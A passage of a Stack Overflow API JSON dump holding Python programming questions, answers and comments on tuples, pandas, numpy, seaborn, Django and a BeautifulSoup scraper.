3, "last_activity_date": 1571867210, "creation_date": 1571867210, "answer_id": 58531401, "question_id": 58531383, "link": "https://stackoverflow.com/questions/58531383/how-do-i-check-if-a-tuple-is-only-made-up-of-two-numbers/58531401#58531401", "title": "How do I check if a tuple is only made up of two numbers?", "body": "<p>Iterate over each value in the tuple, and if it is not 0 or 1, return False.</p>\n\n<pre><code>for value in mytuple:\n    if value not in [0,1]:\n        return False\nreturn True\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 97521, "user_id": 565635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/7b4b3e7c9ac68b7d2c93ad02d0b9c79d?s=128&d=identicon&r=PG", "display_name": "orlp", "link": "https://stackoverflow.com/users/565635/orlp"}, "is_accepted": false, "score": 2, "last_activity_date": 1571867542, "last_edit_date": 1571867542, "creation_date": 1571867220, "answer_id": 58531403, "question_id": 58531383, "link": "https://stackoverflow.com/questions/58531383/how-do-i-check-if-a-tuple-is-only-made-up-of-two-numbers/58531403#58531403", "title": "How do I check if a tuple is only made up of two numbers?", "body": "<p>This works:</p>\n\n<pre><code>def zero_um(tpl):\n    return all(x in [0, 1] for x in tpl)\n</code></pre>\n\n<p><code>x in [0, 1]</code> checks if something is 0 or 1, <code>... for x in tpl</code> performs this for every element <code>x</code>, and <code>all</code> makes sure they are all true, otherwise it returns false.</p>\n\n<p>Alternatively we can write:</p>\n\n<pre><code>def zero_um(tpl):\n    return set(tpl) &lt;= {0, 1}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "edited": false, "score": 0, "creation_date": 1571867489, "post_id": 58531413, "comment_id": 103386644, "body": "Indeed, I misread the question, I thought all items need to be distinct. Updated."}, {"owner": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": "https://stackoverflow.com/users/984421/ekhumoro"}, "edited": false, "score": 1, "creation_date": 1571868238, "post_id": 58531413, "comment_id": 103386872, "body": "Your first example makes no sense. It will only test the first element, and will always return <code>False</code>."}, {"owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "reply_to_user": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": "https://stackoverflow.com/users/984421/ekhumoro"}, "edited": false, "score": 0, "creation_date": 1571868626, "post_id": 58531413, "comment_id": 103386973, "body": "@ekhumoro That example is copied from the OP where I wanted to point out that it&#39;s better to return the expression rather than open if/else branches that return <code>True</code> or <code>False</code>. I&#39;ll clarify that."}], "tags": [], "owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "is_accepted": false, "score": 3, "last_activity_date": 1571868518, "last_edit_date": 1571868518, "creation_date": 1571867278, "answer_id": 58531413, "question_id": 58531383, "link": "https://stackoverflow.com/questions/58531383/how-do-i-check-if-a-tuple-is-only-made-up-of-two-numbers/58531413#58531413", "title": "How do I check if a tuple is only made up of two numbers?", "body": "<p>You can use <code>set(maze) &lt;= {0, 1}</code>.</p>\n\n<p>By the way returning <code>True</code> or <code>False</code> in <code>if</code> branches is never a good idiom since you can just return the expression itself:</p>\n\n<pre><code>return set(maze) &lt;= {0, 1}\n</code></pre>\n\n<p>instead of</p>\n\n<pre><code>if set(maze) &lt;= {0, 1}:\n    return True\nelse:\n    return False\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 12265599, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6ed138e4d48f39cce1ffd616a2de171?s=128&d=identicon&r=PG&f=1", "display_name": "Potato", "link": "https://stackoverflow.com/users/12265599/potato"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1571868518, "creation_date": 1571867073, "last_edit_date": 1571867172, "question_id": 58531383, "link": "https://stackoverflow.com/questions/58531383/how-do-i-check-if-a-tuple-is-only-made-up-of-two-numbers", "title": "How do I check if a tuple is only made up of two numbers?", "body": "<p>I'm trying to make a function that makes sure that my tuple is only made up of zeros or ones.</p>\n\n<pre><code>def zero_um(maze):\n    for i in range(len(maze)):\n        if maze[i]==0 and maze[i]==1:\n                return True\n            else:\n                return False\n</code></pre>\n\n<p>However this will always lead to false because a numer can't be one and zero at the same time.\nBut if i try:</p>\n\n<pre><code>def zero_um(tpl):\n    for i in range(len(tpl)):\n        if tpl[i]==0 or tpl[i]==1:\n                return True\n            else:\n                return False\n</code></pre>\n\n<p>but that accepts asnwers like (1,2)\nI've also tried with using != but ran into similar dilemas</p>\n"}, {"tags": ["python", "pandas", "beautifulsoup"], "comments": [{"owner": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "edited": false, "score": 0, "creation_date": 1571867443, "post_id": 58531376, "comment_id": 103386635, "body": "Can you do a print(df.head()) before writing to a csv file. I don&#39;t think it&#39;s writing to a csv issue"}, {"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 0, "creation_date": 1571867623, "post_id": 58531376, "comment_id": 103386687, "body": "looks like you are writing over the csv within the for loop, try appending the elements of your for loop to a global variable then call it outside the loop."}, {"owner": {"reputation": 189, "user_id": 11656244, "user_type": "registered", "profile_image": "https://graph.facebook.com/2112728745501256/picture?type=large", "display_name": "Ibtsam Ch", "link": "https://stackoverflow.com/users/11656244/ibtsam-ch"}, "reply_to_user": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "edited": false, "score": 0, "creation_date": 1571867799, "post_id": 58531376, "comment_id": 103386739, "body": "@Ram ,edited. kindly check again"}, {"owner": {"reputation": 189, "user_id": 11656244, "user_type": "registered", "profile_image": "https://graph.facebook.com/2112728745501256/picture?type=large", "display_name": "Ibtsam Ch", "link": "https://stackoverflow.com/users/11656244/ibtsam-ch"}, "reply_to_user": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 1, "creation_date": 1571867854, "post_id": 58531376, "comment_id": 103386759, "body": "@Datanovice, can u kindly give an example how to do it. i can&#39;t figure out"}], "answers": [{"tags": [], "owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "is_accepted": false, "score": 0, "last_activity_date": 1571867940, "creation_date": 1571867940, "answer_id": 58531509, "question_id": 58531376, "link": "https://stackoverflow.com/questions/58531376/cant-write-in-a-csv-file-python/58531509#58531509", "title": "Can&#39;t write in a CSV file python", "body": "<p>It seems you are using a mix of libraries to write to a csv, pandas handles all this nicely so there is no need to use the inbuilt csv module from python - </p>\n\n<p>I've modified your code below - this should return your dataframe as a whole df and write it out as a csv.</p>\n\n<p>also using <code>Headers=None</code> you were setting the columns to nothing, so they would be referenced by an index number.</p>\n\n<pre><code>from bs4 import BeautifulSoup\nimport requests\nimport re as resju\n#import csv\nimport pandas as pd\nre = requests.get('https://www.farfeshplus.com/Video.asp?ZoneID=297')\n\nsoup = BeautifulSoup(re.content, 'html.parser')\n\nlinks = soup.findAll('a', {'class': 'opacityit'})\nlinks_with_text = [a['href'] for a in links]\n\nnames_ = [] # global list to hold all iterable variables from your loops\nfinal_links_ = []\n\nfor i in links_with_text:\n    new_re = requests.get(i)\n    new_soup = BeautifulSoup(new_re.content, 'html.parser')\n    m = new_soup.select_one('h1 div')\n    Name = m.text\n    names_.append(name) # append to global list. \n\n\n    print(Name)\n\n    n = new_soup.select_one('iframe')\n    ni = n['src']\n\n    iframe = requests.get(ni)\n    i_soup = BeautifulSoup(iframe.content, 'html.parser')\n\n    d_script = i_soup.select_one('body &gt; script')\n    d_link = d_script.text\n\n    mp4 = resju.compile(r\"(?&lt;=mp4:\\s\\[\\')(.*)\\'\\]\")\n    final_link = mp4.findall(d_link)[0]\n    print(final_link)\n    final_links_.append(final_link) # append to global list.\n\n\ndf = pd.DataFrame(zip(names_, final_links_)) # use global lists.\ndf.columns = ['Name', 'LINK']\n\ndf.to_csv(file, index=False)\n</code></pre>\n"}], "owner": {"reputation": 189, "user_id": 11656244, "user_type": "registered", "profile_image": "https://graph.facebook.com/2112728745501256/picture?type=large", "display_name": "Ibtsam Ch", "link": "https://stackoverflow.com/users/11656244/ibtsam-ch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571868377, "creation_date": 1571867032, "last_edit_date": 1571868377, "question_id": 58531376, "link": "https://stackoverflow.com/questions/58531376/cant-write-in-a-csv-file-python", "title": "Can&#39;t write in a CSV file python", "body": "<p>I am trying to write data into a csv after scrapping using pandas dataframe, but the csv is empty even after program execution. The headers are written first but they are also overwritten when dataframe comes into action.\nHere is the code:</p>\n\n<pre><code>from bs4 import BeautifulSoup\nimport requests\nimport re as resju\nimport csv\nimport pandas as pd\nre = requests.get('https://www.farfeshplus.com/Video.asp?ZoneID=297')\n\nsoup = BeautifulSoup(re.content, 'html.parser')\n\nlinks = soup.findAll('a', {'class': 'opacityit'})\nlinks_with_text = [a['href'] for a in links]\n\nheaders = ['Name', 'LINK']\n# this is output file, u can change the path as you desire, default is the working directory\nfile = open('data123.csv', 'w', encoding=\"utf-8\")\nwriter = csv.writer(file)\nwriter.writerow(headers)\n\nfor i in links_with_text:\n    new_re = requests.get(i)\n    new_soup = BeautifulSoup(new_re.content, 'html.parser')\n    m = new_soup.select_one('h1 div')\n    Name = m.text\n\n    print(Name)\n\n    n = new_soup.select_one('iframe')\n    ni = n['src']\n\n    iframe = requests.get(ni)\n    i_soup = BeautifulSoup(iframe.content, 'html.parser')\n\n    d_script = i_soup.select_one('body &gt; script')\n    d_link = d_script.text\n\n    mp4 = resju.compile(r\"(?&lt;=mp4:\\s\\[\\')(.*)\\'\\]\")\n    final_link = mp4.findall(d_link)[0]\n    print(final_link)\n\n    df = pd.DataFrame(zip(Name, final_link))\n\n    df.to_csv(file, header=None, index=False)\n\nfile.close()\n</code></pre>\n\n<p><code>df.head()</code> returns:</p>\n\n<pre><code> 0  1\n0  \u0644  h\n1  \u064a  t\n2  \u0644  t\n3  \u0649  p\n4     s\n   0  1\n0  \u0644  h\n1  \u064a  t\n2  \u0644  t\n3  \u0649  p\n4     s\n</code></pre>\n\n<p>Any suggestion ?</p>\n"}, {"tags": ["python", "algorithm", "permutation"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571867136, "post_id": 58531373, "comment_id": 103386532, "body": "you should probably set this matrix up as a real matrix in <code>numpy</code>, it does calculations faster, including rotation ones (which will allow you to exclude)"}, {"owner": {"reputation": 7540, "user_id": 4474230, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/713c7ce18010e541853962264a719d83?s=128&d=identicon&r=PG&f=1", "display_name": "Jeffrey", "link": "https://stackoverflow.com/users/4474230/jeffrey"}, "edited": false, "score": 2, "creation_date": 1571867247, "post_id": 58531373, "comment_id": 103386577, "body": "Generate them the same way, but then you can simply discard the permutation where top-left is not the &#39;smallest&#39; of the corners."}, {"owner": {"reputation": 38, "user_id": 4003581, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcf08bf24a28e745276fa18d7a32e5b?s=128&d=identicon&r=PG&f=1", "display_name": "njzt", "link": "https://stackoverflow.com/users/4003581/njzt"}, "reply_to_user": {"reputation": 7540, "user_id": 4474230, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/713c7ce18010e541853962264a719d83?s=128&d=identicon&r=PG&f=1", "display_name": "Jeffrey", "link": "https://stackoverflow.com/users/4474230/jeffrey"}, "edited": false, "score": 0, "creation_date": 1571907896, "post_id": 58531373, "comment_id": 103397983, "body": "@Jeffrey this is brilliant idea, simple and powerful, I wish i could figure it out myself :) thanks!"}], "owner": {"reputation": 38, "user_id": 4003581, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcf08bf24a28e745276fa18d7a32e5b?s=128&d=identicon&r=PG&f=1", "display_name": "njzt", "link": "https://stackoverflow.com/users/4003581/njzt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1571867009, "creation_date": 1571867009, "question_id": 58531373, "link": "https://stackoverflow.com/questions/58531373/how-to-get-all-permutations-of-items-in-matrix-excluding-rotation-clones", "title": "How to get all permutations of items in matrix excluding rotation clones", "body": "<p>I made a python program which solves a logical puzzle game that I bought for my kid. The program already works but gives 4 solutions instead of 1 and works 4 times slower than it should. It happens because currently it uses permutations (from itertools) to generate all possible ordering of puzzle elements but it can be optimized. Let me try to explain:</p>\n\n<p>I have a list of nine unique elements [A,B,C,D,E,F,G,H,I] that represents a matrix 3x3:</p>\n\n<pre><code>A B C\nD E F\nG H I \n</code></pre>\n\n<p>I need to generate all possible permutations of that list but exclude clones that comes from rotating the matrix so for above list the clones are:</p>\n\n<pre><code>[C,F,I,B,E,H,A,D,G]\n[I,H,G,F,E,D,C,B,A]\n[G,D,A,H,E,B,I,F,C]\n</code></pre>\n\n<p>because they represents matrixes which comes from rotating the first matrix</p>\n\n<pre><code>C F I\nB E H\nA D G\n\nI H G\nF E D\nC B A\n\nG D A\nH E B\nI F C\n</code></pre>\n\n<p>Is there some python module that can be used to generate such possibilites? Or maybe you have an idea how such generator may be implemented?</p>\n"}, {"tags": ["python", "django", "django-models", "django-templates"], "comments": [{"owner": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "edited": false, "score": 0, "creation_date": 1571880286, "post_id": 58531364, "comment_id": 103389188, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/2345708/how-can-i-get-the-full-absolute-url-with-domain-in-django\">How can I get the full/absolute URL (with domain) in Django?</a>"}, {"owner": {"reputation": 145, "user_id": 11938019, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PcTU6.png?s=128&g=1", "display_name": "CyberDemic", "link": "https://stackoverflow.com/users/11938019/cyberdemic"}, "reply_to_user": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "edited": false, "score": 0, "creation_date": 1571958639, "post_id": 58531364, "comment_id": 103421257, "body": "Thank you for the link, I will check it out more today. I think I just need to read some more documentation =)"}], "answers": [{"tags": [], "owner": {"reputation": 145, "user_id": 11938019, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PcTU6.png?s=128&g=1", "display_name": "CyberDemic", "link": "https://stackoverflow.com/users/11938019/cyberdemic"}, "is_accepted": false, "score": 0, "last_activity_date": 1572035402, "creation_date": 1572035402, "answer_id": 58565357, "question_id": 58531364, "link": "https://stackoverflow.com/questions/58531364/cant-get-djangos-get-absolute-url-to-set-up-the-link-properly/58565357#58565357", "title": "Can&#39;t get Django&#39;s get_absolute_url to set up the link properly", "body": "<p>So I ended up getting rid of the <code>onclick=\"document.location\"</code> stuff and just wrapped the <code>&lt;div&gt;</code> in a <code>a href=\"{{ category.get_absolute_url }}\"&gt;</code> and the links work just fine.</p>\n"}], "owner": {"reputation": 145, "user_id": 11938019, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PcTU6.png?s=128&g=1", "display_name": "CyberDemic", "link": "https://stackoverflow.com/users/11938019/cyberdemic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1572035402, "creation_date": 1571866956, "question_id": 58531364, "link": "https://stackoverflow.com/questions/58531364/cant-get-djangos-get-absolute-url-to-set-up-the-link-properly", "title": "Can&#39;t get Django&#39;s get_absolute_url to set up the link properly", "body": "<p>I am trying to use the get_absolute_url function in one of my templates like so:</p>\n\n<p><strong>template.html</strong></p>\n\n<pre><code>&lt;div class=\"card-columns\"&gt;\n    {% for category in main_categories %}\n    &lt;div onclick=\"document.location = {{ category.get_absolute_url }};\" class=\"card\"&gt;\n</code></pre>\n\n<p>I'm fairly new to programming in general so I'm not sure if that is the correct way to do it, but I have been able to get it to return a couple views individually by using if statements like this:</p>\n\n<p><strong>models.py</strong></p>\n\n<pre><code>    def get_absolute_url(self):\n        if self.pk == 1:\n            return reverse('forum:index')\n        if self.pk == 2:\n            return reverse('tutorials:cybertips')\n        return reverse('tutorials:subjects', args=[str(self.pk)])\n</code></pre>\n\n<p>I don't get any errors, and when clicking on the cards with pk=1 &amp; pk=2 it returns the correct url pattern. The other cards loads fine but don't link to anything. When inspecting the html it looks like it returns a url so I'm wondering if i'm not understanding the onclick function? Here are my urls(in this app):</p>\n\n<p><strong>urls.py</strong></p>\n\n<pre><code>app_name = 'tutorials'\nurl_patterns = [\n    path('category/&lt;int:pk&gt;/', views.SubjectView.as_view(), name='subjects'),\n    path('cybertips/', views.cybertips, name='cybertips'),\n]\n</code></pre>\n\n<p><strong>views.py</strong></p>\n\n<pre><code>class MainCategoriesView(ListView):\n    model = MainCategory\n    context_object_name = 'main_categories'\n\nclass SubjectView(ListView):\n    model = Subject\n    context_object_name = 'subjects'\n</code></pre>\n\n<p>Any help is appreciated. Or if there is a more efficient and safe way to do it. Thank you.</p>\n"}, {"tags": ["python", "pandas", "matplotlib", "seaborn"], "comments": [{"owner": {"reputation": 842, "user_id": 11738630, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSoVi.png?s=128&g=1", "display_name": "baccandr", "link": "https://stackoverflow.com/users/11738630/baccandr"}, "edited": false, "score": 0, "creation_date": 1571918968, "post_id": 58531321, "comment_id": 103403826, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/30353363/seaborn-regplot-with-colorbar\">Seaborn regplot with colorbar?</a>"}], "owner": {"reputation": 157, "user_id": 1472433, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/51c131799239c3f350c5f17a256fbd5a?s=128&d=identicon&r=PG", "display_name": "xbot", "link": "https://stackoverflow.com/users/1472433/xbot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1571866717, "creation_date": 1571866717, "question_id": 58531321, "link": "https://stackoverflow.com/questions/58531321/colormap-has-wrong-range-when-used-with-seaborn-factegrid-and-pyplot-scatter", "title": "Colormap has wrong range when used with seaborn factegrid and pyplot scatter", "body": "<p>For a Pandas dataframe, I am trying to use Seaborn to create a FacetGrid based on one column ('year') and then create a scatter plot for each subplot where the x and y axes correspond to the columns 'x' and 'y' and the color corresponds to yet another value 'p'. <em>I'm also looking to add a meaningful colorbar as an annotation to the plot.</em> Using my code below, where <code>data</code> is a Pandas dataframe,</p>\n\n<pre><code>import numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# 'data' imported from a csv file\ndata.head()\n          x         y         q         t         p  year\n0  0.864721  0.080396  0.970694  0.848008  2.164305     1\n1  0.615352  0.768370  0.950874  2.902603  2.383057     3\n2  0.775110  0.562287  1.163768  0.151289  4.026925     1\n3  0.355569  0.161638  0.840118  3.075967  0.431773     4\n4  0.405850  0.807168  1.261452  0.242770  1.111010     1\n\ng = sns.FacetGrid(data, col='year', hue='p', palette='seismic')\ng = g.map(plt.scatter, 'x', 'y', s=100, alpha=0.5)\nplt.colorbar()\n</code></pre>\n\n<p>I am able to create this as pictured below.\n<a href=\"https://i.stack.imgur.com/nbRZ0.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/nbRZ0.png\" alt=\"enter image description here\"></a></p>\n\n<p>So I can get a facetgrid with scatter plots. <strong>The problem is that my colorbar on the right hand side is not aligned (in terms of values and color palette) with the circles in the scatter plots.</strong> The true values for 'p' range from 0.15 to 8.2; the values for the colormap range from 0 and 1. In addition, the color palette seems to differ between the plots and the colormap. So a correct colormap would range from dark blue to dark red for the range 0.15 to 8.2.</p>\n\n<p>I suspect that the colormap I'm creating is not \"linked\" to the scatter plots. Instead, pyplot is just creating a generic colormap with a default palette and range in the absence of any data to use.</p>\n\n<p>How can I get this to work?</p>\n"}, {"tags": ["python", "arrays", "pandas", "numpy"], "answers": [{"tags": [], "owner": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "is_accepted": true, "score": 1, "last_activity_date": 1571867426, "creation_date": 1571867426, "answer_id": 58531436, "question_id": 58531295, "link": "https://stackoverflow.com/questions/58531295/convert-pandas-series-and-dataframe-objects-to-a-numpy-array/58531436#58531436", "title": "convert pandas series AND dataframe objects to a numpy array", "body": "<p>IIUC, you may try numpy transpose and <code>reshape</code></p>\n\n<pre><code>df.values.T.reshape(-1,  int(dimension_len), int(dimension_len))\n\nOut[30]:\narray([[[ 0.,  1.,  2.],\n        [ 3.,  4.,  5.],\n        [ 6.,  7.,  8.]],\n\n       [[nan, -2., nan],\n        [ 2., nan, nan],\n        [nan, nan, nan]],\n\n       [[nan, nan,  4.],\n        [nan, nan,  3.],\n        [-4., -3., nan]]])\n</code></pre>\n"}], "owner": {"reputation": 8790, "user_id": 668624, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/qMFcJ.jpg?s=128&g=1", "display_name": "codingknob", "link": "https://stackoverflow.com/users/668624/codingknob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 58531436, "answer_count": 1, "score": 2, "last_activity_date": 1571867426, "creation_date": 1571866554, "question_id": 58531295, "link": "https://stackoverflow.com/questions/58531295/convert-pandas-series-and-dataframe-objects-to-a-numpy-array", "title": "convert pandas series AND dataframe objects to a numpy array", "body": "<h1>Series to Numpy Array:</h1>\n\n<p>I have a <code>pandas</code> series object that looks like the following:</p>\n\n<pre><code>s1 = pd.Series([0,1,2,3,4,5,6,7,8], index=['AB', 'AC','AD', 'BA','BB','BC','CA','CB','CC'])\n</code></pre>\n\n<p>I want to convert this series to a <code>numpy</code> array as follows:</p>\n\n<pre><code>series_size = s1.size\ndimension_len = np.sqrt(series_size) \n**Note: series_size will always have an integer sqrt\n</code></pre>\n\n<p>The dimension_len will determine the size of each of the dimensions in the desired 2 dimensional array. </p>\n\n<p>In the above series object, the dimension_len = 3 so the desired <code>numpy</code> array will be a 3 x 3 array as follows:</p>\n\n<pre><code>np.array([[0, 1, 2], \n[3, 4, 5],\n[6,7, 8]])\n</code></pre>\n\n<h1>Dataframe to Numpy Array:</h1>\n\n<p>I have a <code>pandas</code> dataframe object that looks like the following:</p>\n\n<pre><code>s1 = pd.Series([0,1,2,3,4,5,6,7,8], index=['AA', 'AB','AC', 'BA','BB','BC','CA','CB','CC'])\ns2 = pd.Series([-2,2], index=['AB','BA'])\ns3 = pd.Series([4,3,-3,-4], index=['AC','BC', 'CB','CA'])\n\ndf = pd.concat([s1, s2, s3], axis=1)\n\nmax_size = max(s1.size, s2.size, s3.size)\n\ndimension_len = np.sqrt(max_size)\nnum_columns = len(df.columns)\n**Note: max_size will always have an integer sqrt\n</code></pre>\n\n<p>The resulting <code>numpy</code> array will be determined by the following information:</p>\n\n<p>num_columns = determines number of dimensions of the array\ndimension_len = determines the size of each dimension</p>\n\n<p>In the above example the desired <code>numpy</code> array will be 3 x 3 x 3 (num_columns = 3 and dimension_len = 3)</p>\n\n<p>As well the first column of df will become DESIRED_ARRAY[0], the second column of df will become DESIRED_ARRAY[1], the third column of df will become DESIRED_ARRAY[2] and so on...</p>\n\n<p>The desired array I want looks like:</p>\n\n<pre><code>np.array([[[0, 1, 2], \n[3, 4, 5],\n[6, 7, 8]],\n\n[[np.nan,-2, np.nan],\n[2, np.nan, np.nan],\n[np.nan, np.nan, np.nan]],\n\n[[np.nan,np.nan, 4],\n[np.nan, np.nan, 3],\n[-4, -3, np.nan]],\n])\n</code></pre>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 1, "creation_date": 1571866998, "post_id": 58531292, "comment_id": 103386488, "body": "how can the week end before it&#39;s even begun ? i don&#39;t understand how you merge the week end onto your df, can you explain the logic abit more?"}, {"owner": {"reputation": 43, "user_id": 11709201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1b4bc2979c6d8b9c5d80b56963249e0?s=128&d=identicon&r=PG&f=1", "display_name": "Haibin Chen", "link": "https://stackoverflow.com/users/11709201/haibin-chen"}, "reply_to_user": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 0, "creation_date": 1571869489, "post_id": 58531292, "comment_id": 103387194, "body": "didn&#39;t address it clean. The start and end columns in the results are just repeated of the inputs. the week_ends is the bins eg. the week of 01/13 - 01/20 will be in week ends of 01/20/2019, which should counts as 5 days 01/15 -01/20"}], "answers": [{"comments": [{"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 1, "creation_date": 1571870275, "post_id": 58531798, "comment_id": 103387369, "body": "Looks complex but I&#39;m glad you were able to get there."}], "tags": [], "owner": {"reputation": 43, "user_id": 11709201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1b4bc2979c6d8b9c5d80b56963249e0?s=128&d=identicon&r=PG&f=1", "display_name": "Haibin Chen", "link": "https://stackoverflow.com/users/11709201/haibin-chen"}, "is_accepted": false, "score": 1, "last_activity_date": 1571870088, "creation_date": 1571870088, "answer_id": 58531798, "question_id": 58531292, "link": "https://stackoverflow.com/questions/58531292/pandas-given-start-and-end-date-bin-them-into-weekly-frequency-and-count/58531798#58531798", "title": "Pandas given start and end date, bin them into weekly frequency and count", "body": "<p>OK, I think I figure out one way to get around it. Not an elegant one, so still waiting for better solution. (particularly prefer not to resample to daily)</p>\n\n<p>following  <a href=\"https://stackoverflow.com/questions/42151886/expanding-pandas-data-frame-with-date-range-in-columns\">Expanding pandas data frame with date range in columns</a></p>\n\n<p>the trick is to introduce another column, so the repeated id can be distinguished separately for groupby. below is the codes</p>\n\n<pre><code>prod_id = ['a', 'a', 'b', 'c']\n# add this to differetiate prod_id \"a\" \nnum_id = [1, 2, 3, 4]\nstart_date = ['2019-01-15',  '2019-08-10', '2019-06-15',  '2019-07-10']\nend_date = ['2019-01-28',  '2019-08-15', '2019-07-15',  '2019-07-22']\nd = {'id': prod_id, 'nd': num_id, 'start': start_date, 'end': end_date}\ndf = pd.DataFrame.from_dict(d)\ndf = df[['id', 'nd', 'start', 'end']]\ndf['start'] = pd.to_datetime(df['start'])\ndf['end'] = pd.to_datetime(df['end'])    \n\n\ndf_melt = df.melt(id_vars=['id', 'nd'],value_name='date')\n# first aggregate to daily\ndf_aggr_D = df_melt.groupby(['id', 'nd']).apply(lambda x: x.set_index('date').resample('D').pad()).drop(columns=['id','nd', 